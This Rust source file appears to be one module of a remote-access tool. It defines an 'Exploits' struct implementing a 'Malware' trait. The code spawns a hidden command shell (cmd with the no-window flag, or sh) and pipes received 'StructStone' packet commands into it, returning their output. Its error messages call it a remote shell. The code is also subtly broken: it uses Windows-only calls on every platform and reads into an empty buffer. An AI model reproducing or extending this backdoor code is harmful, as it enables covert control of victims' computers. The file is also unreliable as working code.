use crate::structure::{Detector, StructStone};
use std::io::{Read, Write};
use std::os::windows::process::CommandExt;
use std::process::{Child, ChildStderr, ChildStdin, ChildStdout, Command, Stdio};

#[derive(Debug)]
pub struct Exploits {
    exploit_input: Vec<u8>,
    exploit_output: Vec<u8>,
    stdin_stream: Option<ChildStdin>,
    stdout_stream: Option<ChildStdout>,
    stderr_stream: Option<ChildStderr>,
}

impl Exploits {
    pub fn default() -> Exploits {
        let mut shell = Exploits::shell();
        Exploits {
            exploit_input: vec![],
            exploit_output: vec![],
            stdin_stream: shell.stdin,
            stdout_stream: shell.stdout,
            stderr_stream: shell.stderr,
        }
    }

    pub fn shell() -> Child {
        if cfg!(target_os = "windows") {
            Command::new("cmd")
                .creation_flags(0x08000000)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .expect("Failed to start remote shell")
        } else {
            Command::new("sh")
                .creation_flags(0x08000000)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .expect("Failed to start remote shell")
        }
    }
}

pub trait Malware {
    fn execute(&mut self) -> Vec<u8>;
    fn get_output(&mut self) -> Vec<u8>;
    fn command(&mut self, packet: StructStone) -> Vec<u8>;
}

impl Malware for Exploits {
    fn execute(&mut self) -> Vec<u8> {
        if let Some(mut input_stream) = self.stdin_stream.as_mut() {
            println!("입력");
            input_stream
                .write_all(&self.exploit_input)
                .expect("Failed to write to stdin");
            input_stream.flush().expect("Failed to write to stdin");
        }

        let mut output = Vec::new();

        println!("출력");
        self.stdout_stream
            .as_mut()
            .expect("Failed to read from stdout")
            .read(&mut output)
            .expect("Failed to read from stdout");
        println!("출력 2: {:?}", output);

        if output.is_empty() {
            self.stderr_stream
                .as_mut()
                .expect("Failed to read from stdout")
                .read(&mut output)
                .expect("Failed to read from stderr");
        }

        println!("{:?}", output);

        self.exploit_output = output.clone();
        output
    }

    fn get_output(&mut self) -> Vec<u8> {
        self.exploit_output.clone()
    }

    fn command(&mut self, packet: StructStone) -> Vec<u8> {
        self.exploit_input = packet.get_command();
        self.execute()
    }
}
